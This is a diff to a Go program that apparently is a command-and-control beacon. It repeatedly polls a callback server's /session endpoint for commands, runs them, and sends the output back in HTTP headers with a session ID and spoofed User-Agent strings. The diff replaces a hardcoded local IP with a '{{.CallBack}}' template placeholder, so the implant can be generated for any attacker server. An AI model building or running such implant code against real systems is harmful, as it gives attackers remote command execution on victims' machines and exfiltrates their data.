@@ -108,7 +108,7 @@ func main() {
 	fmt.Printf(toSend)
 
 	//time.Sleep(10)
-	req, err := http.NewRequest("GET", "http://192.168.1.179:8000/", nil)
+	req, err := http.NewRequest("GET", "{{.CallBack}}/", nil)
 	req.Header = http.Header{"APPSESSIONID": {uuid}, "Res": {toSend}, "User-Agent": {"Chromium 110"}}
 	resp, err := client.Do(req)
 
@@ -121,7 +121,7 @@ func main() {
 	// Here we need to add the functionality for sending the results of command execution and go into a loop of waiting for something, then executing, then repeating [all done]
 	for true {
 		// current issue is that we're not retrieving and executing the new ocmmand
-		req, err = http.NewRequest("GET", "http://192.168.1.179:8000/session", nil)
+		req, err = http.NewRequest("GET", "{{.CallBack}}/session", nil)
 		req.Header.Add("APPSESSIONID", uuid)
 		resp, err = client.Do(req)
 		body, err := ioutil.ReadAll(resp.Body)
@@ -136,7 +136,7 @@ func main() {
 		sb := string(body)
 		for sb == "0" {
 			time.Sleep(2 * time.Second)
-			req, err = http.NewRequest("GET", "http://192.168.1.179:8000/session", nil)
+			req, err = http.NewRequest("GET", "{{.CallBack}}/session", nil)
 			req.Header.Add("APPSESSIONID", uuid)
 			resp, err = client.Do(req)
 			body, err := ioutil.ReadAll(resp.Body)
@@ -157,7 +157,7 @@ func main() {
 		fmt.Printf("\n")
 		for statusC == "'500'" {
 			time.Sleep(2 * time.Second)
-			req, err = http.NewRequest("GET", "http://192.168.1.179:8000/session", nil)
+			req, err = http.NewRequest("GET", "{{.CallBack}}/session", nil)
 			req.Header.Add("APPSESSIONID", uuid)
 			resp, err = client.Do(req)
 			body, err := ioutil.ReadAll(resp.Body)
@@ -184,7 +184,7 @@ func main() {
 		if err != nil {
 			// if error is not nil, retry getting the command
 			time.Sleep(2 * time.Second)
-			req, _ = http.NewRequest("GET", "http://192.168.1.179:8000/session", nil)
+			req, _ = http.NewRequest("GET", "{{.CallBack}}/session", nil)
 			req.Header.Add("APPSESSIONID", uuid)
 			resp, _ = client.Do(req)
 			body, _ := ioutil.ReadAll(resp.Body)
@@ -213,7 +213,7 @@ func main() {
 		fmt.Printf(toSend)
 
 		time.Sleep(2 * time.Second)
-		req, err = http.NewRequest("GET", "http://192.168.1.179:8000/schema", nil)
+		req, err = http.NewRequest("GET", "{{.CallBack}}/schema", nil)
 		req.Header = http.Header{"APPSESSIONID": {uuid}, "Res": {toSend}, "User-Agent": {"testing testing"}}
 		resp, err = client.Do(req)
 		if err != nil {
